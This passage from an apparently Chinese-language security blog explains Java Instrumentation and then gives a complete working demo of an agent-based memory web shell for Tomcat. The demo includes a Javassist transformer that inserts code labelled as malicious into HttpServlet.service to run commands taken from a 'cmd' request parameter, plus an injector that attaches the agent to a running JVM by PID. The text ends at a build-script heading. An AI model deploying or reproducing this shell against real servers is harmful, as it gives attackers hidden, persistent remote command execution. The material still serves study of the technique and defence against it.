+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Instrumentation</span> &#123;<br>    <br>    <span class="hljs-comment">//增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">addTransformer</span><span class="hljs-params">(ClassFileTransformer transformer, <span class="hljs-type">boolean</span> canRetransform)</span>;<br> <br>    <span class="hljs-comment">//在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">addTransformer</span><span class="hljs-params">(ClassFileTransformer transformer)</span>;<br> <br>    <span class="hljs-comment">//删除一个类转换器</span><br>    <span class="hljs-type">boolean</span> <span class="hljs-title function_">removeTransformer</span><span class="hljs-params">(ClassFileTransformer transformer)</span>;<br> <br> <br>    <span class="hljs-comment">//在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">retransformClasses</span><span class="hljs-params">(Class&lt;?&gt;... classes)</span> <span class="hljs-keyword">throws</span> UnmodifiableClassException;<br> <br>    <span class="hljs-comment">//判断一个类是否被修改</span><br>    <span class="hljs-type">boolean</span> <span class="hljs-title function_">isModifiableClass</span><span class="hljs-params">(Class&lt;?&gt; theClass)</span>;<br> <br>    <span class="hljs-comment">// 获取目标已经加载的类。</span><br>    <span class="hljs-meta">@SuppressWarnings(&quot;rawtypes&quot;)</span><br>    Class[] getAllLoadedClasses();<br> <br>    <span class="hljs-comment">//获取一个对象的大小</span><br>    <span class="hljs-type">long</span> <span class="hljs-title function_">getObjectSize</span><span class="hljs-params">(Object objectToSize)</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="获取目标JVM已加载类"><a href="#获取目标JVM已加载类" class="headerlink" title="获取目标JVM已加载类"></a>获取目标JVM已加载类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.test;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Java_Agent_agentmain_Instrumentation</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">agentmain</span><span class="hljs-params">(String args,  Instrumentation inst)</span> <span class="hljs-keyword">throws</span> InterruptedException&#123;<br>        Class[] classes = inst.getAllLoadedClasses();<br><br>        <span class="hljs-keyword">for</span>(Class cls : classes)&#123;<br>            System.out.println(<span class="hljs-string">&quot;=======================&quot;</span>);<br>            System.out.println(<span class="hljs-string">&quot;加载类：&quot;</span> + cls.getName());<br>            System.out.println(<span class="hljs-string">&quot;是否可被修改：&quot;</span> + inst.isModifiableClass(cls));<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">Manifest-Version: 1.0<br>Agent-Class: com.test.Java_Agent_agentmain_Instrumentation<br>Can-Redefine-Classes: true<br>Can-Retransform-Classes: true<br>Can-Set-Native-Method-Prefix: true<br></code></pre></td></tr></table></figure>
+
+
+
+<p>创建 jar</p>
+<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">jar cvfm Instrumentation.jar ..\src\main\resources\MANIFEST.MF .\Java_Agent_agentmain_Instrumentation.<span class="hljs-keyword">class</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/52403351/1762422656588-c0f73018-27de-47c9-997b-503f4024baed.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>使用 InjectAgent.java 测试</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081524580.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p> 能够获取目标JVM已加载类</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523648.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h4 id="transform-转换器"><a href="#transform-转换器" class="headerlink" title="transform - 转换器"></a>transform - 转换器</h4><p>在Instrumentation接口中，我们可以通过**addTransformer()**来添加一个transformer（转换器），关键属性就是ClassFileTransformer类。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。</span><br><span class="hljs-keyword">void</span> <span class="hljs-title function_">addTransformer</span><span class="hljs-params">(ClassFileTransformer transformer, <span class="hljs-type">boolean</span> canRetransform)</span>;<br></code></pre></td></tr></table></figure>
+
+
+
+<p><strong>ClassFileTransformer</strong>接口中只有一个**transform()**方法，返回值为字节数组，作为转换后的字节码注入到目标JVM中。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523698.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>在通过 addTransformer 注册一个transformer后，每次定义或者重定义新类都会调用transformer。所谓定义，即是通过ClassLoader.defineClass加载进来的类。而重定义是通过Instrumentation.redefineClasses方法重定义的类。</p>
+<p>当存在多个转换器时，转换将由 transform 调用链组成。 也就是说，一个 transform 调用返回的 byte 数组将成为下一个调用的输入（通过 classfileBuffer 参数）。</p>
+<p>转换将按以下顺序应用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">不可重转换转换器<br>不可重转换本机转换器<br>可重转换转换器<br>可重转换本机转换器<br></code></pre></td></tr></table></figure>
+
+
+
+<p>至于transformer中对字节码的具体操作，则需要使用到Javassisit类。</p>
+<h4 id="Instrumentation的局限性"><a href="#Instrumentation的局限性" class="headerlink" title="Instrumentation的局限性"></a>Instrumentation的局限性</h4><p>大多数情况下，我们使用Instrumentation都是使用其字节码插桩的功能，简单来说就是类重定义功能（Class Redefine），但是有以下局限性：</p>
+<p>premain和agentmain两种方式修改字节码的时机都是类文件加载之后，也就是说必须要带有Class类型的参数，不能通过字节码文件和自定义的类名重新定义一个本来不存在的类。</p>
+<p>类的字节码修改称为类转换(Class Transform)，类转换其实最终都回归到类重定义I<code>nstrumentation#redefineClasses</code>方法，此方法有以下限制：</p>
+<ol>
+<li>新类和老类的父类必须相同</li>
+<li>新类和老类实现的接口数也要相同，并且是相同的接口</li>
+<li>新类和老类访问符必须一致。 新类和老类字段数和字段名要一致</li>
+<li>新类和老类新增或删除的方法必须是private static&#x2F;final修饰的</li>
+<li>可以修改方法体</li>
+</ol>
+<h2 id="4-3-Agent-内存马注入"><a href="#4-3-Agent-内存马注入" class="headerlink" title="4.3 Agent 内存马注入"></a>4.3 Agent 内存马注入</h2><p>看了许多师傅关于Agent内存马注入的文章和博客，各有千秋，利用方式也各不相同。现在，我根据自己的理解来编写一个小demo。</p>
+<h3 id="4-3-1-方式一（后续可能会复现其他师傅的利用方式）"><a href="#4-3-1-方式一（后续可能会复现其他师傅的利用方式）" class="headerlink" title="4.3.1 方式一（后续可能会复现其他师傅的利用方式）"></a>4.3.1 方式一（后续可能会复现其他师傅的利用方式）</h3><h4 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h4><ol>
+<li>编译并打包 <code>AgentMemShell</code> 为 <code>agentmemshell.jar</code>。</li>
+<li>编译 <code>Injector</code>（需要 <code>tools.jar</code>，通常在 <code>JAVA_HOME/lib/</code> 下）。</li>
+<li>运行 <code>Injector</code>，指定目标 Tomcat 的 PID。</li>
+<li>访问任何 Servlet 路径，带上 <code>?cmd=whoami</code> 参数，即可执行命令。</li>
+</ol>
+<h4 id="可用-Demo："><a href="#可用-Demo：" class="headerlink" title="可用 Demo："></a>可用 Demo：</h4><h5 id="目录结构：-1"><a href="#目录结构：-1" class="headerlink" title="目录结构："></a>目录结构：</h5><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081524589.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h5 id="pom-xml"><a href="#pom-xml" class="headerlink" title="pom.xml"></a>pom.xml</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;project xmlns=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br>		 xsi:schemaLocation=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;<br>	&lt;modelVersion&gt;<span class="hljs-number">4.0</span><span class="hljs-number">.0</span>&lt;/modelVersion&gt;<br>	<br>	&lt;groupId&gt;com.src&lt;/groupId&gt;<br>	&lt;artifactId&gt;Demo01&lt;/artifactId&gt;<br>	&lt;version&gt;<span class="hljs-number">1.0</span>-SNAPSHOT&lt;/version&gt;<br>	&lt;packaging&gt;jar&lt;/packaging&gt;<br>	<br>	&lt;properties&gt;<br>		&lt;project.build.sourceEncoding&gt;UTF-<span class="hljs-number">8</span>&lt;/project.build.sourceEncoding&gt;<br>		&lt;maven.compiler.source&gt;<span class="hljs-number">1.8</span>&lt;/maven.compiler.source&gt;<br>		&lt;maven.compiler.target&gt;<span class="hljs-number">1.8</span>&lt;/maven.compiler.target&gt;<br>	&lt;/properties&gt;<br>	&lt;build&gt;<br>		&lt;plugins&gt;<br>			&lt;!-- 编译插件 --&gt;<br>			&lt;plugin&gt;<br>				&lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;<br>				&lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;<br>				&lt;version&gt;<span class="hljs-number">3.8</span><span class="hljs-number">.1</span>&lt;/version&gt;<br>				&lt;configuration&gt;<br>					&lt;source&gt;<span class="hljs-number">1.8</span>&lt;/source&gt;<br>					&lt;target&gt;<span class="hljs-number">1.8</span>&lt;/target&gt;<br>					&lt;encoding&gt;UTF-<span class="hljs-number">8</span>&lt;/encoding&gt;<br>				&lt;/configuration&gt;<br>			&lt;/plugin&gt;<br>			<br>			&lt;!-- 打包 JAR 插件 --&gt;<br>			&lt;plugin&gt;<br>				&lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;<br>				&lt;artifactId&gt;maven-jar-plugin&lt;/artifactId&gt;<br>				&lt;version&gt;<span class="hljs-number">3.2</span><span class="hljs-number">.2</span>&lt;/version&gt;<br>				&lt;configuration&gt;<br>					&lt;archive&gt;<br>						&lt;!-- 确保生成标准 MANIFEST 文件 --&gt;<br>						&lt;manifest&gt;<br>							&lt;addClasspath&gt;<span class="hljs-literal">true</span>&lt;/addClasspath&gt;<br>							&lt;useUniqueVersions&gt;<span class="hljs-literal">false</span>&lt;/useUniqueVersions&gt;<br>						&lt;/manifest&gt;<br>						<br>						&lt;!-- 这里写入 Agent 属性 --&gt;<br>						&lt;manifestEntries&gt;<br>							&lt;Agent-Class&gt;com.src.agent.AgentMain&lt;/Agent-Class&gt;<br>							&lt;Can-Redefine-Classes&gt;<span class="hljs-literal">true</span>&lt;/Can-Redefine-Classes&gt;<br>							&lt;Can-Retransform-Classes&gt;<span class="hljs-literal">true</span>&lt;/Can-Retransform-Classes&gt;<br>						&lt;/manifestEntries&gt;<br>					&lt;/archive&gt;<br>				&lt;/configuration&gt;<br>			&lt;/plugin&gt;<br>		&lt;/plugins&gt;<br>	&lt;/build&gt;<br><br><br>&lt;/project&gt;<br></code></pre></td></tr></table></figure>
+
+
+
+<h5 id="AgentMemShell-java"><a href="#AgentMemShell-java" class="headerlink" title="AgentMemShell.java"></a>AgentMemShell.java</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.agent;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AgentMemShell</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">agentmain</span><span class="hljs-params">(String agentArgs, Instrumentation inst)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;AgentMemShell Injected!&quot;</span>);<br><br>        <span class="hljs-comment">// 添加类转换器</span><br>        inst.addTransformer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletTransformer</span>(), <span class="hljs-literal">true</span>);<br><br>        <span class="hljs-comment">// 找到所有已加载的 HttpServlet 类并进行重转换</span><br>        Class[] loadedClasses = inst.getAllLoadedClasses();<br>        <span class="hljs-keyword">for</span> (Class clazz : loadedClasses) &#123;<br>            <span class="hljs-keyword">if</span> (clazz.getName().equals(<span class="hljs-string">&quot;javax.servlet.http.HttpServlet&quot;</span>)) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    System.out.println(<span class="hljs-string">&quot;Found HttpServlet:&quot;</span>+clazz);<br>                    inst.retransformClasses(clazz);<br>                    System.out.println(<span class="hljs-string">&quot;Retransform HttpServlet Success.&quot;</span>);<br>                &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                    e.printStackTrace();<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">premain</span><span class="hljs-params">(String agentArgs, Instrumentation inst)</span> &#123;<br>        agentmain(agentArgs, inst);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h5 id="ServletTransformer-java"><a href="#ServletTransformer-java" class="headerlink" title="ServletTransformer.java"></a>ServletTransformer.java</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.agent;<br><br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><span class="hljs-keyword">import</span> javassist.LoaderClassPath;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.ClassFileTransformer;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ServletTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ClassFileTransformer</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] transform(ClassLoader loader,<br>                            String className,<br>                            Class&lt;?&gt; classBeingRedefined,<br>                            ProtectionDomain protectionDomain,<br>                            <span class="hljs-type">byte</span>[] classfileBuffer) &#123;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 打印所有被加载的类，便于调试（仅第一次注入时启用）</span><br>            <span class="hljs-keyword">if</span> (className != <span class="hljs-literal">null</span> &amp;&amp; className.contains(<span class="hljs-string">&quot;servlet&quot;</span>)) &#123;<br>                System.out.println(<span class="hljs-string">&quot;[Debug] Loading class: &quot;</span> + className);<br>            &#125;<br><br>            <span class="hljs-comment">// className 可能是 &quot;javax/servlet/http/HttpServlet&quot;</span><br>            <span class="hljs-comment">// 也可能是 &quot;javax.servlet.http.HttpServlet&quot;</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">dotName</span> <span class="hljs-operator">=</span> className.replace(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br><br>            <span class="hljs-comment">// 精确匹配 HttpServlet 类</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;javax.servlet.http.HttpServlet&quot;</span>.equals(dotName)) &#123;<br>                System.out.println(<span class="hljs-string">&quot;[+] Found target class: &quot;</span> + dotName);<br>                System.out.println(<span class="hljs-string">&quot;[+] Start transforming HttpServlet...&quot;</span>);<br><br>                <span class="hljs-comment">// 初始化 Javassist ClassPool 并添加当前 ClassLoader 的路径</span><br>                <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>                <span class="hljs-keyword">if</span> (loader != <span class="hljs-literal">null</span>) &#123;<br>                    classPool.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LoaderClassPath</span>(loader));<br>                &#125;<br><br>                <span class="hljs-comment">// 获取类定义</span><br>                <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.get(dotName);<br>                <span class="hljs-type">CtMethod</span> <span class="hljs-variable">serviceMethod</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;service&quot;</span>);<br><br>                <span class="hljs-comment">// 恶意逻辑</span><br>                <span class="hljs-type">String</span> <span class="hljs-variable">shell</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span><br>                        + <span class="hljs-string">&quot;&#123;&quot;</span><br>                        + <span class="hljs-string">&quot;    javax.servlet.http.HttpServletRequest req = (javax.servlet.http.HttpServletRequest)$1;&quot;</span><br>                        + <span class="hljs-string">&quot;    javax.servlet.http.HttpServletResponse res = (javax.servlet.http.HttpServletResponse)$2;&quot;</span><br>                        + <span class="hljs-string">&quot;    String cmd = req.getParameter(\&quot;cmd\&quot;);&quot;</span><br>                        + <span class="hljs-string">&quot;    if (cmd != null) &#123;&quot;</span><br>                        + <span class="hljs-string">&quot;        try &#123;&quot;</span><br>                        + <span class="hljs-string">&quot;            java.util.Scanner s = new java.util.Scanner(&quot;</span><br>                        + <span class="hljs-string">&quot;                Runtime.getRuntime().exec(cmd).getInputStream(), \&quot;UTF-8\&quot;&quot;</span><br>                        + <span class="hljs-string">&quot;            ).useDelimiter(\&quot;\\\\A\&quot;);&quot;</span><br>                        + <span class="hljs-string">&quot;            String output = s.hasNext() ? s.next() : \&quot;\&quot;;&quot;</span><br>                        + <span class="hljs-string">&quot;            res.setContentType(\&quot;text/plain;charset=UTF-8\&quot;);&quot;</span><br>                        + <span class="hljs-string">&quot;            res.getWriter().write(output);&quot;</span><br>                        + <span class="hljs-string">&quot;            res.getWriter().flush();&quot;</span><br>                        + <span class="hljs-string">&quot;            return;&quot;</span><br>                        + <span class="hljs-string">&quot;        &#125; catch (Exception e) &#123;&quot;</span><br>                        + <span class="hljs-string">&quot;            e.printStackTrace();&quot;</span><br>                        + <span class="hljs-string">&quot;        &#125;&quot;</span><br>                        + <span class="hljs-string">&quot;    &#125;&quot;</span><br>                        + <span class="hljs-string">&quot;&#125;&quot;</span>;<br><br>                <span class="hljs-comment">// 在 service 方法的开头插入</span><br>                serviceMethod.insertBefore(shell);<br><br>                <span class="hljs-type">byte</span>[] newClassBytes = ctClass.toBytecode();<br>                ctClass.detach();<br><br>                System.out.println(<span class="hljs-string">&quot;[+] HttpServlet Transformed Complete.&quot;</span>);<br>                <span class="hljs-keyword">return</span> newClassBytes;<br>            &#125;<br><br>        &#125; <span class="hljs-keyword">catch</span> (Throwable e) &#123;<br>            System.out.println(<span class="hljs-string">&quot;[!] Transform failed: &quot;</span> + e);<br>            e.printStackTrace();<br>        &#125;<br><br>        <span class="hljs-comment">// 返回 null 表示不修改该类</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h5 id="Injector-java"><a href="#Injector-java" class="headerlink" title="Injector.java"></a>Injector.java</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.injector;<br><br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachine;<br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Injector</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-keyword">if</span> (args.length &lt; <span class="hljs-number">2</span>) &#123;<br>            System.out.println(<span class="hljs-string">&quot;Usage: java -jar injector.jar &lt;pid&gt; &lt;agent_jar_path&gt;&quot;</span>);<br>            System.out.println(<span class="hljs-string">&quot;Available JVM processes:&quot;</span>);<br>            listProcesses();<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">pid</span> <span class="hljs-operator">=</span> args[<span class="hljs-number">0</span>];<br>        <span class="hljs-type">String</span> <span class="hljs-variable">agentJarPath</span> <span class="hljs-operator">=</span> args[<span class="hljs-number">1</span>];<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;Trying to attach to PID: &quot;</span> + pid);<br>            <span class="hljs-type">VirtualMachine</span> <span class="hljs-variable">vm</span> <span class="hljs-operator">=</span> VirtualMachine.attach(pid);<br>            vm.loadAgent(agentJarPath);<br>            vm.detach();<br>            System.out.println(<span class="hljs-string">&quot;[+] Agent injected successfully!&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            System.err.println(<span class="hljs-string">&quot;[-] Injection failed: &quot;</span> + e.getMessage());<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">listProcesses</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            List&lt;VirtualMachineDescriptor&gt; vmList = VirtualMachine.list();<br>            <span class="hljs-keyword">for</span> (VirtualMachineDescriptor vmd : vmList) &#123;<br>                System.out.println(<span class="hljs-string">&quot;PID: &quot;</span> + vmd.id() + <span class="hljs-string">&quot; - &quot;</span> + vmd.displayName());<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            System.err.println(<span class="hljs-string">&quot;[-] Failed to list processes: &quot;</span> + e.getMessage());<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h5 id="MANIFEST-MF"><a href="#MANIFEST-MF" class="headerlink" title="MANIFEST.MF"></a>MANIFEST.MF</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">Manifest-Version: 1.0<br>Agent-Class: com.src.agent.AgentMemShell<br>Can-Redefine-Classes: true<br>Can-Retransform-Classes: true<br>Built-By: maven<br>Created-By: Apache Maven<br>Build-Jdk: 1.8.0_65<br></code></pre></td></tr></table></figure>
+
+
+
+<p>这是 一个小脚本：</p>
+<h5 id="build-bat"><a href="#build-bat" class="headerlink" title="build.bat"></a>build.bat</h5><p>(部分内容根据实际情况自行修改)</p>
